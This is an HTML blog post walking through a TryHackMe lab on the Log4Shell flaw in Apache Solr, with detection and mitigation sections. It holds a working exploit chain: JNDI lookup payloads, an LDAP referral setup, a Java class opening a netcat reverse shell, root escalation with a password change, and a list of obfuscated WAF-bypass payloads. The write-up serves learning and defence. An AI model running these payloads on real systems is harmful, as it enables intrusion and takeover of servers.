@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apache Log4Shell Analysis - Ryan's Blog</title>
+
+    <!-- SEO Meta Description -->
+    <meta name="description"
+        content="An analysis of the Apache Log4j vulnerability CVE-2021-44228, exploring exploitation techniques, mitigation strategies, and a walkthrough of TryHackMe's 'Solar' room by John Hammond.">
+
+    <!-- Open Graph Meta Tags for Social Sharing -->
+    <meta property="og:title" content="Apache Log4Shell Analysis">
+    <meta property="og:description"
+        content="A comprehensive look into the Apache Log4j vulnerability, including exploitation and mitigation methods.">
+    <meta property="og:url" content="https://ryanlongoria.com/posts/apache-log4shell-analysis.html">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://ryanlongoria.com/images/log4shell_banner.jpg">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Apache Log4Shell Analysis">
+    <meta name="twitter:description"
+        content="An in-depth analysis of the Apache Log4j vulnerability CVE-2021-44228, with exploitation and mitigation insights.">
+    <meta name="twitter:image" content="https://ryanlongoria.com/images/log4shell_banner.jpg">
+
+    <!-- Structured Data with Schema.org -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "Apache Log4Shell Analysis",
+        "description": "An analysis of the Apache Log4j vulnerability CVE-2021-44228, exploring exploitation techniques, mitigation strategies, and a walkthrough of TryHackMe's 'Solar' room by John Hammond.",
+        "author": {
+            "@type": "Person",
+            "name": "Ryan Longoria"
+        },
+        "publisher": {
+            "@type": "Organization",
+            "name": "Ryan Longoria's Blog",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://ryanlongoria.com/images/gengar_logo.png"
+            }
+        },
+        "datePublished": "2022-01-19",
+        "url": "https://ryanlongoria.com/posts/apache-log4shell-analysis.html",
+        "image": "https://ryanlongoria.com/images/apache_log4shell_analysis.jpg"
+    }
+    </script>
+
+    <!-- CSS Link -->
+    <link rel="stylesheet" href="../css/styles.css">
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/themes/prism.min.css" rel="stylesheet" />
+</head>
+
+<body>
+    <!-- Particles.js Container -->
+    <div id="particles-js"></div>
+
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="logo-container">
+                <div class="logo">
+                    <a href="../index.html">
+                        <img src="../images/gengar_logo.png" alt="DFIR Automation Blog Logo">
+                    </a>
+                </div>
+                <h1 class="banner-title">Ryan Longoria's Blog</h1>
+            </div>
+            <nav aria-label="Main Navigation">
+                <ul>
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="../about.html">About</a></li>
+                    <li><a href="../contact.html">Contact</a></li>
+                    <li class="dropdown">
+                        <a href="#" class="dropbtn">Categories</a>
+                        <div class="dropdown-content">
+                            <a href="../categories/incident-response.html">Incident Response</a>
+                            <a href="../categories/digital-forensics.html">Digital Forensics</a>
+                            <a href="../categories/misc.html">Misc</a>
+                        </div>
+                    </li>
+                </ul>
+                <div class="menu-toggle" id="mobile-menu" aria-label="Toggle navigation menu" aria-expanded="false">
+                    <span class="bar"></span>
+                    <span class="bar"></span>
+                    <span class="bar"></span>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container">
+        <article class="post-content">
+            <h1>Apache Log4Shell Analysis</h1>
+            <p><em>Published on 2022-01-19</em></p>
+
+            <p><strong>Category:</strong> <a href="../categories/incident-response.html">Incident Response</a></p>
+
+            <figure>
+                <img src="../images/log4shell_banner.jpg" alt="Apache Log4Shell">
+            </figure>
+            <br>
+
+            <p>The Apache Log4j vulnerability was discovered around December 10, 2021, and has been all over the
+                internet in the past couple of weeks—and rightfully so. Log4j is a Java-based logging tool used by
+                well-known systems and services such as Amazon, Microsoft Azure, Minecraft, VMware, Cisco, Splunk, and
+                many more. To make matters worse, this was a zero-day vulnerability, meaning that services knew about
+                the vulnerability but had not released a patch for it yet. This also means that all these systems and
+                services could have been exploited through the Log4j vulnerability at any given time until a patch could
+                be released. Log4j was assigned the identification CVE-2021-44228 for its remote code execution
+                vulnerability. It also has a Denial-of-Service (DoS) vulnerability categorized as CVE-2021-45046.</p>
+
+            <p>In this blog, I will be following TryHackMe and <a href="https://tryhackme.com/r/room/solar"
+                    target="_blank" rel="noopener noreferrer">John Hammond's room</a>, which focuses on testing,
+                exploiting, and mitigating the vulnerability CVE-2021-44228. In this lab, a web-based virtual machine
+                provided by TryHackMe will be used. A machine that will be targeted has software installed that uses
+                Log4j. An IP address of the target machine is provided, and some reconnaissance has to be done to
+                discover where the Log4j vulnerability is.</p>
+
+            <h2>Reconnaissance</h2>
+            <p>To start off, a terminal will be opened, and we want to know what ports are open and available on this
+                machine. To do this, we need to perform a scan on the IP, and Nmap is the perfect tool to do so.</p>
+
+            <pre><code>nmap -v -p- TARGET.MACHINE.IP.ADDRESS</code></pre>
+
+            <p>To run normally, we don't need any switches, but to get the output we want, we need the <code>-v</code>
+                and <code>-p-</code> switches. Why? The <code>-v</code> switch increases the verbosity level, meaning
+                that the scan will give us more information in the output. The switch <code>-p-</code> is key here
+                because it allows us to scan all ports on the given IP. After the switches, we specify the IP of the
+                target machine. Now, running this scan, we get the output as shown below.</p>
+
+            <figure>
+                <img src="../images/nmap_scan_output.jpg" alt="Nmap Scan Output">
+            </figure>
+            <br>
+
+            <p>We see that there are a total of 65,532 closed ports and 3 open ports. Port 22 utilizes the "ssh"
+                service, and port 111 carries the "rpcbind" service. Both of these services do not use Log4j. Only one
+                other port is open, and that is 8983, but there is one problem. Under the service tab, we notice that
+                the service is unknown. This means that we will not know if the service utilizes Log4j or not. We can
+                try to solve this with this new Nmap command.</p>
+
+            <pre><code>nmap -sV -p 8983 TARGET.MACHINE.IP.ADDRESS</code></pre>
+
+            <p>In this new command, the switch <code>-sV</code> was added, and it attempts to find the exact version of
+                a service running on a target machine. The switch <code>-p</code> followed by the unknown service's port
+                number is also added. The <code>-p</code> switch simply allows you to specify a port number in the
+                command to run a scan against. After running this scan, we get the output as shown below.</p>
+
+            <figure>
+                <img src="../images/nmap_service_version.jpg" alt="Nmap Service Version">
+            </figure>
+            <br>
+
+            <p>We notice that we actually receive the service name of HTTP and a version of Apache Solr. The actual
+                service for this port is Apache Solr, and this service does indeed utilize Log4j in its software.</p>
+
+            <h2>Discovery</h2>
+            <p>After finding out what kind of software utilizes Log4j on the target machine, let's check out Apache
+                Solr's web interface.</p>
+
+            <figure>
+                <img src="../images/apache_solr_interface.jpg" alt="Apache Solr Interface">
+            </figure>
+            <br>
+
+            <p>On the dashboard, there are tons of arguments displayed, but the main one that we are interested in is
+                <code>/var/solr/logs</code> because that is where Solr stores its logs.</p>
+
+            <figure>
+                <img src="../images/solr_logs_directory.jpg" alt="Solr Logs Directory">
+            </figure>
+            <br>
+
+            <p>After looking at an example log file named <code>solr.log</code>, it can be found that there is a large
+                number of repeated requests to the endpoint path <code>/admin/cores</code>.</p>
+
+            <figure>
+                <img src="../images/solr_log_entries.jpg" alt="Solr Log Entries">
+            </figure>
+            <br>
+
+            <p>Now, we are looking for some kind of possible data entry point that a user can control.</p>
+
+            <figure>
+                <img src="../images/solr_params_field.jpg" alt="Solr Params Field">
+            </figure>
+            <br>
+
+            <p>Among the log entries above, we can see a couple of lines that are different from the rest. Almost every
+                line has a blank "params" field, but a couple have that same field with <code>id=1337</code> in them.
+                This means that there could possibly be a way that the field can be exploited by passing in something
+                malicious.</p>
+
+            <h2>Proof of Concept</h2>
+            <p>The endpoint that we discovered previously can be viewed through a web interface as shown below.</p>
+
+            <figure>
+                <img src="../images/solr_endpoint.jpg" alt="Solr Endpoint">
+            </figure>
+            <br>
+
+            <p>Log4j itself is a logging utility, but to add more information to its logs, it parses information to
+                these logs, and this is basically where the vulnerability is. There are other forms of syntax that may
+                be executed, such as:</p>
+
+            <p>Some examples of this syntax given by John Hammond in the TryHackMe room are:</p>
+            <ul>
+                <li><code>${sys:os.name}</code></li>
+                <li><code>${sys:user.name}</code></li>
+                <li><code>${log4j:configParentLocation}</code></li>
+                <li><code>${env:PATH}</code></li>
+                <li><code>${env:HOSTNAME}</code></li>
+                <li><code>${java:version}</code></li>
+            </ul>
+
+            <p>The general payload that exploits the Log4j vulnerability is as follows:</p>
+
+            <pre><code>${jndi:ldap://ATTACKERCONTROLLEDHOST}</code></pre>
+
+            <p>Java Naming and Directory Interface (JNDI) is an application programming interface (API), and Log4j uses
+                this for functionality. A Lightweight Directory Access Protocol (LDAP) is used as a server to reach out
+                to <code>ATTACKERCONTROLLEDHOST</code>. With this payload, a malicious attacker can inject code—and that
+                is always bad.</p>
+
+            <p>Now, we're getting closer to the exploitation task of this lab, but we have to prepare the environment.
+            </p>
+
+            <p>The first thing that we need to know is the IP address of our machine, and that can be done through the
+                following command:</p>
+
+            <pre><code>ip addr show</code></pre>
+
+            <p>The next preparation step is to create a connection to a service that listens on any port. The following
+                command will do just that:</p>
+
+            <pre><code>nc -lnvp 9999</code></pre>
+
+            <p>The above command uses the Netcat utility as a port listener by sending over UDP packets to a specific
+                port. This command uses 5 flags in total. The <code>-l</code> flag is used to tell Netcat to listen for
+                a connection. The <code>-n</code> flag tells Netcat not to do any Domain Name System (DNS) or service
+                lookups. The <code>-v</code> flag is used to increase verbosity, or display more information in the
+                output as explained previously. Finally, the <code>-p</code> flag is used to specify a specific port,
+                and in this example, I am using port 9999; however, you can use any port you'd like here.</p>
+
+            <p>After executing the above command, I received the following output:</p>
+
+            <figure>
+                <img src="../images/netcat_listener.jpg" alt="Netcat Listener">
+            </figure>
+            <br>
+
+            <p>This is great news because we are successfully listening. It states that we are listening on
+                <code>[0.0.0.0]</code>, which means all addresses. It also specifies that we are listening on port 9999
+                like we wanted to. We need to keep this command running while we perform exploitation, so let's open a
+                new terminal. To make things easier, I used tmux, a terminal multiplexer that allows me to view two
+                screens at once. You can also use other terminal multiplexers such as GNU Screen, Konsole, or many
+                others.</p>
+
+            <p>Now, we have to run an HTTP GET request to receive data with the following one-line command:</p>
+
+            <pre><code>curl 'http://TARGET.MACHINE.IP.ADDRESS:8983/solr/admin/cores?foo=${jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999}'</code></pre>
+
+            <p>Client URL, or <code>curl</code>, is a utility that allows you to transfer data over a network. Here, we
+                are trying to receive a connection from Solr through the payload that we mentioned earlier. After
+                running this command, we successfully receive a connection as shown below.</p>
+
+            <figure>
+                <img src="../images/received_connection.jpg" alt="Received Connection">
+            </figure>
+            <br>
+
+            <p>Since we successfully received a connection, this means that our target is definitely vulnerable. We can
+                now stop the Netcat listener.</p>
+
+            <h2>Exploitation</h2>
+            <p>We previously saw that the target machine is vulnerable and can be exploited. We were previously only
+                listening with an LDAP request. Now, the first thing that we have to do is start an HTTP server. In this
+                case, I will be doing it with Python 3 using the following command:</p>
+
+            <pre><code>python3 -m http.server</code></pre>
+
+            <p>The <code>-m</code> in this command is used to specify a module—in which we specified
+                <code>http.server</code>. The <code>http.server</code> module is used to start a simple local HTTP
+                server. The server will be serving on port 8000. After running this command, we successfully start our
+                local server as shown below.</p>
+
+            <figure>
+                <img src="../images/http_server_started.jpg" alt="HTTP Server Started">
+            </figure>
+            <br>
+
+            <p>You do not have to keep the above command running yet. This was run for testing purposes to ensure that
+                it is run correctly.</p>
+
+            <p>We now need to obtain an LDAP Referral Server, which will basically allow us to send our HTTP GET request
+                that we sent earlier somewhere else. After this, we can send in another payload to allow us to inject
+                code into the target machine. John Hammond in the TryHackMe room breaks this down into three steps:</p>
+            <ol>
+                <li><code>${jndi:ldap://attackerserver:1389/Resource}</code> &rarr; reaches out to our LDAP Referral
+                    Server</li>
+                <li>LDAP Referral Server springboards the request to a secondary
+                    <code>http://attackerserver/resource</code></li>
+                <li>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code>
+                </li>
+            </ol>
+
+            <p>To stage an LDAP referral server, we will be using the <code>marshalsec</code> utility. By using
+                TryHackMe's attackbox, <code>marshalsec</code> is already pre-installed but can be installed <a
+                    href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener noreferrer">here</a>.
+                Now, we need to navigate to the directory where <code>marshalsec</code> is installed and run the
+                following command to build the utility:</p>
+
+            <pre><code>mvn clean package -DskipTests</code></pre>
+
+            <p>To start an LDAP referral server, we will run the following one-line command using Java 8:</p>
+
+            <pre><code>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"</code></pre>
+
+            <p>After running this command, we get the following output to the terminal:</p>
+
+            <figure>
+                <img src="../images/ldap_referral_server.jpg" alt="LDAP Referral Server">
+            </figure>
+            <br>
+
+            <p>This means that we have successfully created an LDAP server, and it is waiting. We need to keep this
+                server running, so let's open a new terminal session to send our second payload.</p>
+
+            <p>In this new terminal session, we want to write some code in Java. Let's move to a different directory and
+                create a Java file named <code>Exploit.java</code>. You can use any text editor like Vim, Nano, or any
+                that you prefer. I personally use Vim, so the following command is what I used to create our
+                <code>Exploit.java</code> file:</p>
+
+            <pre><code>vim Exploit.java</code></pre>
+
+            <p>After entering the text editor for your <code>Exploit.java</code> file, you will want to enter in the
+                following lines of code and replace <code>YOUR.ATTACKER.IP.ADDRESS</code> with your IP address. You may
+                also want to replace the port number with the one that you used earlier of your choosing.</p>
+
+            <pre><code>import java.io.IOException;
+
+public class Exploit {
+    public Exploit() {
+        try {
+            Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}</code></pre>
+
+            <p>This code is basically allowing us to run <code>nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999</code> as a
+                command in a shell. The command is driven with Netcat, and it is going to be executed on the target and
+                tell its machine to call back to our machine. After saving this code, we will want to compile it with
+                the following command in the terminal:</p>
+
+            <pre><code>javac Exploit.java -source 8 -target 8</code></pre>
+
+            <p>It will have now created a new file named <code>Exploit.class</code>. You can verify that a new file has
+                been created by typing the <code>ls</code> command into the terminal as shown below.</p>
+
+            <figure>
+                <img src="../images/exploit_class_created.jpg" alt="Exploit.class Created">
+            </figure>
+            <br>
+
+            <p>Now, we want to start our HTTP server with Python 3 as we mentioned earlier with the following command:
+            </p>
+
+            <pre><code>python3 -m http.server</code></pre>
+
+            <figure>
+                <img src="../images/http_server_running.jpg" alt="HTTP Server Running">
+            </figure>
+            <br>
+
+            <p>After leaving the above HTTP server running, we now need a third terminal session open to prepare a
+                Netcat listener to catch a reverse shell with the following command. Note, you can swap 9999 with the
+                port you have chosen to use:</p>
+
+            <pre><code>nc -lnvp 9999</code></pre>
+
+            <figure>
+                <img src="../images/netcat_listener_ready.jpg" alt="Netcat Listener Ready">
+            </figure>
+            <br>
+
+            <p>The syntax of the above Netcat command was reviewed earlier, so I won't go over it again. We should now
+                have one terminal session open with our LDAP referral server, a second with our HTTP server, and a third
+                with a Netcat listener.</p>
+
+            <p>We now need a fourth terminal session open to trigger the exploit that we created and open up a reverse
+                shell prompt. Let's run the following one-line command in our fourth session to do so:</p>
+
+            <pre><code>curl 'http://TARGET.MACHINE.IP.ADDRESS:8983/solr/admin/cores?foo=${jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit}'</code></pre>
+
+            <p>After running this command, we have successfully exploited the victim machine as shown below!</p>
+
+            <figure>
+                <img src="../images/reverse_shell_obtained.jpg" alt="Reverse Shell Obtained">
+            </figure>
+            <br>
+
+            <p>The Netcat terminal window should allow us to enter commands to the victim machine. Thus, we have
+                exploited Log4j on Apache Solr!</p>
+
+            <h2>Persistence</h2>
+            <p>Since we have shell access to the victim machine, we can do pretty much anything that we want. Let's run
+                the following command to check what user we are logged into. Note, this will be done in the Netcat
+                terminal window:</p>
+
+            <pre><code>whoami</code></pre>
+
+            <figure>
+                <img src="../images/whoami_output.jpg" alt="Whoami Output">
+            </figure>
+            <br>
+
+            <p>From here, we can see that we are under the profile username of <code>solr</code>.</p>
+
+            <p>If we want to check if we have superuser permissions, we can run the following command:</p>
+
+            <pre><code>sudo -l</code></pre>
+
+            <p>For Secure Shell Protocol (SSH) access, we want to become root and change the password of the
+                <code>solr</code> account that we are currently on with the following two commands:</p>
+
+            <pre><code>sudo bash
+passwd solr</code></pre>
+
+            <p>Now, we can use our fourth terminal window to SSH into the victim machine and enter any commands of our
+                choosing remotely. This can be done with the following command:</p>
+
+            <pre><code>ssh solr@TARGET.MACHINE.IP.ADDRESS</code></pre>
+
+            <h2>Detection</h2>
+            <p>On a vulnerable machine, we can explore log files to see if it has been exploited. From a previous step,
+                we found out that log files are stored in the directory <code>/var/solr/logs</code> for Apache Solr. On
+                the victim machine that we just exploited, we can navigate to that directory through SSH or a reverse
+                shell, and we see the below log entry:</p>
+
+            <figure>
+                <img src="../images/log4j_exploit_log.jpg" alt="Log4j Exploit Log">
+            </figure>
+            <br>
+
+            <p>Notice how when we reviewed logs earlier, we discussed how code can be injected into <code>params</code>?
+                We can see that our JNDI syntax was successfully placed into it. This is one of the biggest ways that
+                you can detect someone exploiting the Log4j vulnerability.</p>
+
+            <h2>Bypasses</h2>
+            <p>The payload that we used in this lab can be powerful in some cases, but it gets easily caught by Web
+                Application Firewalls (WAFs). There are a ton of stronger bypasses that can be used to give you a better
+                chance at avoiding these WAFs. For example, you can use the below bypasses for better chances at
+                exploiting Log4j:</p>
+
+            <pre><code>${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+${${::-j}ndi:rmi://attackerendpoint.com/}</code></pre>
+
+            <h2>Mitigation</h2>
+            <p>Now, we want to mitigate this vulnerability the best that we can against the exploit that we have been
+                using previously. You can review mitigation techniques at Apache Solr's website, or click <a
+                    href="https://solr.apache.org/security.html" target="_blank" rel="noopener noreferrer">here</a>. One
+                technique is to modify the <code>solr.in.sh</code> file in the target's filesystem. Let's SSH back into
+                the target machine, and we can find this file with the following command:</p>
+
+            <pre><code>locate solr.in.sh</code></pre>
+
+            <p>After locating the file, we can open it up with a text editor and insert the following line of code at
+                the bottom of the file. Note, if you are not root, you will need to specify <code>sudo</code> before you
+                edit the file in order to save changes:</p>
+
+            <pre><code>SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"</code></pre>
+
+            <figure>
+                <img src="../images/solr_in_sh_modified.jpg" alt="solr.in.sh Modified">
+            </figure>
+            <br>
+
+            <p>After saving the modified file, we need to restart the Solr service for the changes to take effect. We
+                can do this with the following command:</p>
+
+            <pre><code>sudo /etc/init.d/solr restart</code></pre>
+
+            <p>Now, we want to make sure that we have successfully applied this mitigation technique. We can do this by
+                attempting to break into the victim machine once more. Let's start back up the LDAP referral server,
+                HTTP server, and Netcat listener the same way as before. After starting them back up, we can start the
+                same JNDI payload attack with the <code>curl</code> command we used previously.</p>
+
+            <figure>
+                <img src="../images/exploit_attempt_after_mitigation.jpg" alt="Exploit Attempt After Mitigation">
+            </figure>
+            <br>
+
+            <p>Notice how we do not get any response from the Netcat listener? I also typed in a <code>whoami</code>
+                command to verify that it is not connected, and nothing showed up. This means that we have successfully
+                implemented this mitigation technique.</p>
+
+            <h2>Patching</h2>
+            <p>On December 17, 2021, Apache finally released a patch for Log4j, ending sleepless nights for many
+                security professionals. However, Log4j is not completely safe just yet. My assumption is that this
+                vulnerability will take many years to ever be fully safe because of how many ways it can be exploited
+                even after this most recent patch. Researchers and professionals will continue to look for ways to make
+                this vulnerability safer in the coming years. Make sure that you and others update the logging-log4j
+                package to version 2.17.0 as soon as possible if you discover that you have the package anywhere in your
+                systems.</p>
+
+            <h2>Conclusion</h2>
+            <p>I want to thank John Hammond and TryHackMe for putting so much effort into this room and making it
+                possible for me to explore and learn about how CVE-2021-44228 works as a whole.</p>
+        </article>
+    </main>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="gengar-shadow"></div>
+            <div class="social">
+                <a href="https://x.com/kyro_sec" target="_blank" rel="noopener noreferrer">Twitter</a> |
+                <a href="https://www.linkedin.com/in/ryan-longoria/" target="_blank"
+                    rel="noopener noreferrer">LinkedIn</a> |
+                <a href="https://github.com/ryan-longoria" target="_blank" rel="noopener noreferrer">GitHub</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript Files -->
+    <!-- Particles.js Library -->
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+
+    <!-- Custom Scripts -->
+    <script src="../js/scripts.js"></script>
+
+    <!-- Prism.js for Syntax Highlighting -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-java.min.js"></script>
+</body>
+
+</html>
